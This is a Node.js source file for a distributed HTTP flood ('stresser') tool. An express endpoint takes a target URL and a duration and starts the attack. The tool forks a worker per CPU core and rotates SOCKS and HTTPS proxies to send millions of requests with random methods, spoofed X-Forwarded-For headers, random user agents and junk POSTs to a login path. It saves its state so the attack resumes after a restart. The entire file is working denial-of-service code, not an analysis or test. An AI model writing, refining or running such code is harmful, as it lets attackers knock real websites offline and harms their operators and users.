const cluster = require('cluster');
const os = require('os');
const express = require('express');
const { request } = require('undici');
const fs = require('fs').promises;
const path = require('path');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { rainbow } = require('gradient-string');
const { fakeState } = require('./fakeState.js');
const randomUseragent = require('random-useragent');

const numCPUs = os.cpus().length;
const DEFAULT_PORT = 25694;
const WORKER_PORTS = Array.from({length: numCPUs}, (_, i) => DEFAULT_PORT + i);

if (cluster.isMaster) {
    console.log(rainbow(`Master ${process.pid} is running`));

    // Fork workers with sequential ports
    WORKER_PORTS.forEach((port, i) => {
        const worker = cluster.fork({ 
            WORKER_PORT: port,
            WORKER_TYPE: i === 0 ? 'MAIN' : 'ATTACK' 
        });
        
        // Forward messages from workers to all other workers
        worker.on('message', (msg) => {
            for (const id in cluster.workers) {
                if (cluster.workers[id] !== worker) {
                    cluster.workers[id].send(msg);
                }
            }
        });
    });

    cluster.on('exit', (worker, code, signal) => {
        console.log(rainbow(`Worker ${worker.process.pid} died`));
        const newWorker = cluster.fork({
            WORKER_PORT: worker.process.env.WORKER_PORT,
            WORKER_TYPE: worker.process.env.WORKER_TYPE
        });
    });
} else {
    const app = express();
    app.use(express.json());

    const stateFilePath = path.join(__dirname, 'attackState.json');
    const proxyFilePath = path.join(__dirname, 'proxy.txt');
    const port = parseInt(process.env.WORKER_PORT);
    const isMainWorker = process.env.WORKER_TYPE === 'MAIN';

    // Attack configuration
    const numThreads = 10000;
    const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
    const requestsPerMethod = 1000000;

    // State management
    let attackState = {
        continueAttack: false,
        targetUrl: null,
        startTime: null,
        duration: null
    };

    const ensureStateFileExists = async () => {
        try {
            await fs.access(stateFilePath);
        } catch {
            await fs.writeFile(stateFilePath, JSON.stringify({
                continueAttack: false,
                targetUrl: null,
                startTime: null,
                duration: null
            }));
        }
    };

    const saveState = async (state) => {
        try {
            await fs.writeFile(stateFilePath, JSON.stringify(state, null, 2));
        } catch (err) {
            console.error(rainbow(`[${process.env.WORKER_TYPE}] Failed to save state:`), err);
        }
    };

    const loadState = async () => {
        await ensureStateFileExists();
        try {
            const data = await fs.readFile(stateFilePath, 'utf-8');
            return JSON.parse(data);
        } catch (err) {
            console.error(rainbow(`[${process.env.WORKER_TYPE}] Failed to load state:`), err);
            return {
                continueAttack: false,
                targetUrl: null,
                startTime: null,
                duration: null
            };
        }
    };

    const isValidUrl = (url) => {
        try {
            new URL(url);
            return /^https?:\/\//i.test(url);
        } catch {
            return false;
        }
    };

    // Attack functions
    const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

    const createHeaders = (url) => {
        const urlObj = new URL(url);
        const origin = `${urlObj.protocol}//${urlObj.host}`;
        
        return {
            'User-Agent': randomUseragent.getRandom(),
            'Accept': getRandomElement(['text/html', 'application/json', '*/*']),
            'Accept-Language': getRandomElement(['en-US', 'fr-FR']),
            'Origin': origin,
            'Referer': origin,
            'Connection': 'keep-alive',
            'X-Forwarded-For': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`
        };
    };

    const loadProxies = async () => {
        try {
            const data = await fs.readFile(proxyFilePath, 'utf-8');
            return data.split('\n').filter(line => line.trim());
        } catch {
            return [];
        }
    };

    const performAttack = async (url, agent) => {
        if (!attackState.continueAttack) return;

        const headers = createHeaders(url);
        const requests = [];

        // Generate random requests
        for (let i = 0; i < requestsPerMethod; i++) {
            const method = getRandomElement(httpMethods);
            requests.push(
                request(url, {
                    method,
                    headers,
                    dispatcher: agent,
                    maxRedirections: 0
                }).catch(() => {})
            );

            // For POST requests, add fake state
            if (method === 'POST') {
                requests.push(
                    request(`${url}/login`, {
                        method: 'POST',
                        headers: { ...headers, 'Content-Type': 'application/json' },
                        body: JSON.stringify({ state: fakeState() }),
                        dispatcher: agent,
                        maxRedirections: 0
                    }).catch(() => {})
                );
            }
        }

        await Promise.all(requests);
        setImmediate(() => performAttack(url, agent));
    };

    const startAttack = async (url, durationHours) => {
        if (!isValidUrl(url)) {
            console.error(rainbow(`[${process.env.WORKER_TYPE}] Invalid URL`));
            return;
        }

        const proxies = await loadProxies();
        if (proxies.length === 0) {
            console.error(rainbow(`[${process.env.WORKER_TYPE}] No proxies found`));
            return;
        }

        // Update state
        attackState = {
            continueAttack: true,
            targetUrl: url,
            startTime: Date.now(),
            duration: durationHours * 3600 * 1000
        };

        if (isMainWorker) {
            await saveState(attackState);
            process.send({ type: 'NEW_ATTACK', target: url, duration: durationHours });
        }

        // Set attack timeout
        if (isMainWorker) {
            setTimeout(() => {
                attackState.continueAttack = false;
                fs.unlink(stateFilePath).catch(() => {});
                process.send({ type: 'STOP_ATTACK' });
            }, attackState.duration);
        }

        // Start attack threads
        const threadsPerWorker = Math.ceil(numThreads / numCPUs);
        for (let i = 0; i < Math.min(threadsPerWorker, proxies.length); i++) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const agent = proxy.startsWith('socks') 
                ? new SocksProxyAgent(proxy, { timeout: 5000 })
                : new HttpsProxyAgent(proxy, { timeout: 5000 });
            
            performAttack(url, agent);
        }
    };

    // API Endpoints (Main worker only)
    if (isMainWorker) {
        app.get('/stresser', async (req, res) => {
            const { url, duration } = req.query;
            const durationHours = parseFloat(duration) || 1;

            if (!isValidUrl(url)) {
                return res.status(400).json({ error: 'Invalid URL' });
            }

            res.json({ message: 'Attack started' });
            await startAttack(url, durationHours);
        });
    }

    // Worker communication
    process.on('message', (msg) => {
        if (msg.type === 'NEW_ATTACK') {
            attackState = {
                continueAttack: true,
                targetUrl: msg.target,
                startTime: Date.now(),
                duration: msg.duration * 3600 * 1000
            };
            startAttack(msg.target, msg.duration);
        } else if (msg.type === 'STOP_ATTACK') {
            attackState.continueAttack = false;
        }
    });

    // Initialize
    const init = async () => {
        const state = await loadState();
        if (state.continueAttack && isValidUrl(state.targetUrl)) {
            const remainingTime = (state.startTime + state.duration - Date.now()) / 3600000;
            if (remainingTime > 0) {
                attackState = state;
                startAttack(state.targetUrl, remainingTime);
            }
        }
    };

    app.listen(port, () => {
        console.log(rainbow(`[${process.env.WORKER_TYPE}] Worker ${process.pid} running on port ${port}`));
        init();
    });
}